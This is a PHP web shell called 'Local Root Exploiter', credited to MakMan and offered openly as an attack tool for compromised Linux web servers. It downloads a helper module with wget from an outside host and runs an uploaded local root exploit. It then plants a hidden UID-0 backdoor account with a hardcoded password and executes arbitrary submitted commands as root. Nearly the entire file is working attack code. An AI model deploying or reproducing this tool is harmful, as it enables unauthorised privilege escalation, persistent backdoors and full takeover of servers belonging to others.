<?php
// By MakMan - http://www.mukarramkhalid.com

ini_set('error_reporting', 0);
ini_set('max_execution_time', 0);

$user     = "makman";
$passwd   = "makman";
$path     = "/tmp/";
$pmakman  = "pexpect_makman.py";
$pscript  = "makman_script.py";
$pexploit = "makman_script_exploit.py";
$pexpect  = "http://makman.tk/scripts/pexpect_makman.py";
$cmd      = ( isset( $_POST["cmd"] ) ? $_POST["cmd"] : '' );
$exploit  = ( isset( $_POST["check_exploit"] ) ? $_FILES["exploit"]["name"] : '' );
$script   = "
import pexpect_makman
child = pexpect_makman.spawn('su - ".$user."', timeout = 3)
child.expect('Password:')
child.sendline('".$passwd."')
child.expect(['~#', '#'])
child.sendline('".$cmd."')
child.expect(['~#', '#'])
print child.before
child.close()
";
$script_exploit    = "
import pexpect_makman

try:    
    child = pexpect_makman.spawn('".$path.$exploit."', timeout = 8)
    child.expect(' ', timeout = 5)
    child.sendline('useradd -ou 0 -g 0 ".$user."')
    child.expect(' ', timeout = 1)
    child.sendline('passwd ".$user."')
    child.expect('password:', timeout = 1)
    child.sendline('".$passwd."')
    child.expect('password:', timeout = 1)
    child.sendline('".$passwd."')
    out = child.read()
except:
    print 'Some exceptions were thrown.'

print 'Done. Refreshing page in 2 second.'
";

?>

<!doctype html>
<html>
<head>
    <meta charset='utf-8'>
    <title>MakMan</title>
    <style type='text/css'>
    body
    {
        font:                 normal 15px Verdana;
        color:                #ffffff;
        background-color:     #000000;
    }
    textarea
    {
        width:                100%;
        height:               300px;
        resize:               none;
        overflow-y:           scroll;
    }
    pre
    {
        text-align:           center;
    }
    a
    {
        text-decoration:      none;
        color:                #ff0000;
    }
    a:hover
    {
        text-decoration:      underline;
        color:                #ff0000;
    }
    .green
    {
        font:                  normal 15px Verdana;
        color:                 #00ff00;
        text-align:            center;
    }
    .red
    {
        font:                  normal 15px Verdana;
        color:                 #ff0000;
        text-align:            center;
    }
    </style>
</head>
<body>
<pre>
+-+-+-+-+-+ +-+-+-+-+ +-+-+-+-+-+-+-+-+-+
|L|o|c|a|l| |R|o|o|t| |E|x|p|l|o|i|t|e|r|
+-+-+-+-+-+ +-+-+-+-+ +-+-+-+-+-+-+-+-+-+
</pre>
<h1 class='red'>By <a href='http://mukarramkhalid.com'>MakMan</a></h1>
<pre>
----------------------------------------------------------------------
</pre>
<?php

    ################################      MAKMAN_FUNCTIONS     #################################

    function download_module( $module_url, $module_path ) {
        if( !file_exists( $module_path ) || filesize($module_path) == 0 ) {
            exec( "wget ".$module_url." -O ".$module_path );
            if( !file_exists( $module_path ) || filesize($module_path) == 0 ) {
                return false;
            }
            else
                return true;
        }
        return true;
    }

    function write_script( $source, $script_path ) {
        file_put_contents( $script_path , $source );
        if( file_exists( $script_path ) )
            return true;
        else
            return false;
    }

    function format_output( $out ) {
        foreach( $out as $o ) {
            echo htmlspecialchars( preg_replace( "/\x1b\[[0-9;]*m/", "", trim( $o ) ) )."\n";
        }
    }

    function execute_cmd( $scr, $pex , $pex_path, $psc_path) {
        if( download_module( $pex, $pex_path ) ) {
            if( write_script( $scr, $psc_path ) ) {
                exec( "python ".$psc_path, $output );
                format_output( $output );
            }
            else {
                echo "Script '$psc_path' wasn't successfully written or not accessible.\nTry creating it manually.";
            }
        }
        else {
            echo "Failed to download the module.\nDownload it from $pex and create it manually here $pex_path";
        }
    }

    function execute_exploit( $exp, $scr_e, $pex, $pex_path, $psc_path ) {
        if( download_module( $pex, $pex_path ) ) {
            move_uploaded_file( $_FILES["exploit"]["tmp_name"], $exp );
            chmod( $exp, 0777 );
            if( write_script( $scr_e, $psc_path ) ) {
                exec( "python ".$psc_path, $output );
                format_output( $output );
            }
            else{
                echo "Script '$psc_path' wasn't successfully written or not accessible.\nTry creating it manually.";
            }
        }
        else {
            echo "Failed to download the module.\nDownload it from $pex and create it manually here $pex_path";
        }
    }

    function check_user( $usr ) {
        $passwd_file = file_get_contents( '/etc/passwd' );
        if( strpos( $passwd_file, $usr.":x:" ) !== false ) {
            return true;
        }
        else {
            return false;
        }
    }

    function check_os() {
        if ( strtoupper( substr( PHP_OS, 0, 3 ) ) === "WIN" ) {
            exit( "<p class='red'>Only works on Linux</p></body></html>" );
        }    
    }

    ################################      MAKMAN_MAIN     #########################################

    check_os();

    if( check_user( $user ) ) {
        
        echo "<p class='green'>Session (User) exists. Insert commands to execute.</p>";
        echo "<textarea>";
        if( isset( $_POST["cmd"] ) ) {
            execute_cmd( $script, $pexpect, $path.$pmakman, $path.$pscript);
        }
        echo "</textarea>";
        echo "
                <center>
                <form method='POST' action=''>
                <input name='cmd' type='text' autofocus><br>
                <input name='Submit' value='Submit' type='submit'><br>
                </form>
                </center>
            ";

    }

    else {

        if( isset( $_POST["check_exploit"] ) ) {
            echo "<textarea>";
            execute_exploit( $path.$exploit, $script_exploit, $pexpect, $path.$pmakman, $path.$pexploit );
            echo "</textarea>";
            header( "Refresh:2" );
        }
        echo "<p class='red'>Session (User) not found. Upload your local root exploit to execute.</p>";
        echo "
                <center>
                <form method='POST' action='' enctype='multipart/form-data'>
                <input name='check_exploit' type='hidden' value='1'>
                <input name='exploit' type='file'>
                <input name='Submit' value='Submit' type='submit'><br>
                </form>
                </center>
            ";

    }


?>


</body>
</html>
